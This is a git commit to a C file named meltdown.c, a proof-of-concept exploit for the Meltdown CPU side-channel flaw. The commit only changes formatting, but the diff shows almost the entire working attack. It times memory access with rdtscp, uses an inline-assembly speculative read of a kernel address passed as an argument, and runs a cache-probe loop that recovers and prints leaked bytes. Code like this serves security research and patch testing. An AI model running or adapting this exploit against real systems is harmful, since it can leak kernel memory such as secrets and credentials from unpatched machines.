f2cc0b152e43298bf808251942efcae17ad14b3c
wzh9969 <37007622+wzh9969@users.noreply.github.com>
2018-07-02 22:19:21 +0800

    Update meltdown.c

--- meltdown.c
+++ meltdown.c
@@ -16,17 +16,17 @@ int cache_threshold;
 /*获取访问目标地址的时间*/
 static int get_access_time(volatile char *addr)
 {
-int time1, time2;
-int zero=0;
-time1 = __rdtscp(&zero);
-(void)*addr;
-time2 = __rdtscp(&zero);
-return time2 - time1;
+	int time1, time2;
+	int zero = 0;
+	time1 = __rdtscp(&zero);
+	(void)*addr;
+	time2 = __rdtscp(&zero);
+	return time2 - time1;
 }
 
 extern char stopspeculate[];
 
-static void speculate(unsigned long addr){
+static void speculate(unsigned long addr) {
 	asm volatile (
 		/*塞一些操作保证后面断攻击代码可以乱序执行*/
 		".rept 500\n\t"
@@ -40,21 +40,23 @@ static void speculate(unsigned long addr){
 		"stopspeculate: \n\t"
 		"nop\n\t"
 		:
-		: [target] "r" (target_array),
-		  [addr] "r" (addr)
+	: [target] "r" (target_array),
+		[addr] "r" (addr)
 		: "rax", "rbx"
-	);
+		);
 }
 
 
 int attackonebyte(int fd, unsigned long addr)
 {
-	int i,max = -1, max_i = 0,j,k;
+	int i, max = -1, max_i = 0, j, k;
 	static char buf[256];
 	memset(check_array, 0, sizeof(check_array));
-	for (i = 0; i < 1000; i++) {
+	for (i = 0; i < 1000; i++) 
+	{
 		max_i = pread(fd, buf, sizeof(buf), 0);
-		if (max_i < 0) {
+		if (max_i < 0) 
+		{
 			perror("pread");
 			break;
 		}
@@ -63,17 +65,20 @@ int attackonebyte(int fd, unsigned long addr)
 		speculate(addr);
 		int time;
 		/*检查target数组中那些项进入了缓存*/
-	volatile char *addr;
-	for (j = 0; j <ARRAY_SIZE; j++) {
-		addr = &target_array[j * PAGE_SIZE];
-		time = get_access_time(addr);
-		if(time*time<cache_threshold)
-			check_array[j]++;
+		volatile char *addr;
+		for (j = 0; j <ARRAY_SIZE; j++) 
+		{
+			addr = &target_array[j * PAGE_SIZE];
+			time = get_access_time(addr);
+			if (time*time<cache_threshold)
+				check_array[j]++;
+		}
 	}
-	}
-	max_i=-1;
-	for (i = 0; i < ARRAY_SIZE; i++) {
-		if (check_array[i] > max) {
+	max_i = -1;
+	for (i = 0; i < ARRAY_SIZE; i++) 
+	{
+		if (check_array[i] > max) 
+		{
 			max = check_array[i];
 			max_i = i;
 		}
@@ -102,9 +107,10 @@ int set_signal(void)
 /*设置缓存时间阀值*/
 void set_cached_threshold(void)
 {
-	long cached,uncached;
+	long cached, uncached;
 	int i;
-	for (uncached = 0, i = 0; i < 10000; i++) {
+	for (uncached = 0, i = 0; i < 10000; i++) 
+	{
 		_mm_clflush(target_array);
 		uncached += get_access_time(target_array);
 	}
@@ -112,52 +118,52 @@ void set_cached_threshold(void)
 		cached += get_access_time(target_array);
 	cached /= 10000;
 	uncached /= 10000;
-	cache_threshold=cached*uncached;
+	cache_threshold = cached * uncached;
 }
 int main(int argc, char *argv[])
 {
-	int i, ret,j,max,max_i,k;
+	int i, ret, j, max, max_i, k;
 	int fd;
 	unsigned long addr;
-	int size=10;
+	int size = 10;
 	static char record[50];
 	static int attemp[ARRAY_SIZE];
 	sscanf(argv[1], "%lx", &addr);
 	sscanf(argv[2], "%dx", &size);
-	ret=set_signal();
+	ret = set_signal();
 	memset(target_array, 1, sizeof(target_array));
 	set_cached_threshold();
 	fd = open("/proc/version", O_RDONLY);
 	for (i = 0; i < size; i++)
 	{
 		memset(attemp, 0, sizeof(attemp));
-		max=-1; max_i=0;
-		for(j=0;j<ATTEMP;j++)
+		max = -1; max_i = 0;
+		for (j = 0; j<ATTEMP; j++)
 		{
-		ret = attackonebyte(fd, addr);
+			ret = attackonebyte(fd, addr);
 #if MOREINFO
-		printf("%c ",isprint(ret)?ret:' ');
+			printf("%c ", isprint(ret) ? ret : ' ');
 #endif
-		attemp[ret]++;
-		for (k = 0; k < ARRAY_SIZE; k++) 
-		{
-		if (attemp[k] > max&&isprint(k)) 
-		{
-			max = attemp[k];
-			max_i = k;
+			attemp[ret]++;
+			for (k = 0; k < ARRAY_SIZE; k++)
+			{
+				if (attemp[k] > max&&isprint(k))
+				{
+					max = attemp[k];
+					max_i = k;
+				}
+			}
 		}
-		}
-		}
-		ret=max_i;
-		printf("read:%lx data=%2x %c", addr, ret,isprint(ret)?ret:' ');
-		#if MOREINFO
-		printf("  %din%d",max,ATTEMP);
-		#endif
+		ret = max_i;
+		printf("read:%lx data=%2x %c", addr, ret, isprint(ret) ? ret : ' ');
+#if MOREINFO
+		printf("  %din%d", max, ATTEMP);
+#endif
 		printf("\n");
-		record[i]=isprint(ret)?ret:' ';
+		record[i] = isprint(ret) ? ret : ' ';
 		addr++;
 	}
-	printf("ALL information:\n%s\n",record);
+	printf("ALL information:\n%s\n", record);
 	close(fd);
 	return 0;
 }
